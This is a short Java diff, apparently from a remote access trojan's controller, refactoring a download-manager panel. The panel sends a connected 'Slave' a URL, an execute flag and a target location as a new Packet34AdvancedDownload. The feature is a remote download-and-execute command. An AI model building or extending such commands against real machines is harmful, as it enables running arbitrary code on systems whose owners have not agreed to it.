@@ -18,8 +18,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet34AdvancedDownload;
 import com.redpois0n.ui.renderers.JComboBoxIconRenderer;
 import com.redpois0n.utils.IconUtils;
 
@@ -73,13 +72,7 @@ public class PanelControlDownloadManager extends PanelControlParent {
 				}
 				model.addRow(new Object[] { IconUtils.getIcon("update", true), txtURL.getText().trim(), chckbxExecute.isSelected() + "", comboBox.getSelectedItem().toString(), "Sent..." });
 				
-				PacketBuilder packet = new PacketBuilder(OutgoingHeader.CUSTOM_DOWNLOAD);
-				
-				packet.add(txtURL.getText().trim());
-				packet.add(chckbxExecute.isSelected() + "");
-				packet.add(comboBox.getSelectedItem().toString().toLowerCase());
-				
-				sl.addToSendQueue(packet);
+				sl.addToSendQueue(new Packet34AdvancedDownload(txtURL.getText().trim(), chckbxExecute.isSelected(), comboBox.getSelectedItem().toString().toLowerCase()));
 			}
 		});
 		btnDownload.setIcon(new ImageIcon(PanelControlDownloadManager.class.getResource("/icons/down_arrow.png")));
